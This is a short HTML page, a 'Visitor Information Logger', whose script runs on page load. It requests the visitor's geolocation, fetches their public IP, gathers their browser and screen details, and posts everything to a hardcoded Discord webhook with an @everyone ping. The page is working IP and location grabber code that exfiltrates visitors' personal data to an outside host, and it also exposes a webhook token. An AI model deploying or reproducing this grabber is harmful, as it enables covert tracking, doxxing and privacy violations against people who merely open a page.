<!DOCTYPE html>
<html>
<head>
    <title>Visitor Information Logger</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                console.log("Geolocation is not supported by this browser.");
            }
        }

        function showPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const locationData = {
                latitude: latitude,
                longitude: longitude
            };

            fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    const userAgent = navigator.userAgent;
                    const language = navigator.language;
                    const screenWidth = window.screen.width;
                    const screenHeight = window.screen.height;
                    const visitorData = {
                        ip: ip,
                        userAgent: userAgent,
                        language: language,
                        screenWidth: screenWidth,
                        screenHeight: screenHeight,
                        location: locationData
                    };
                    const webhookURL = 'https://discord.com/api/webhooks/1302684161852702730/YiE1EIC9F0U5ayDfXEdhSi4H1tiNilrSysfPTpFRJ6BEZ5jdia5QwHaYbf4oSlj8zgvp';
                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ content: `Visitor's Information @everyone : ${JSON.stringify(visitorData)}` })
                    });
                });
        }
    </script>
</head>
<body onload="getLocation()">
    <h1>Visitor Information Logger</h1>
    <p>This page will log various details about the visitor, including their location, and send it to a Discord webhook.</p>
</body>
</html>
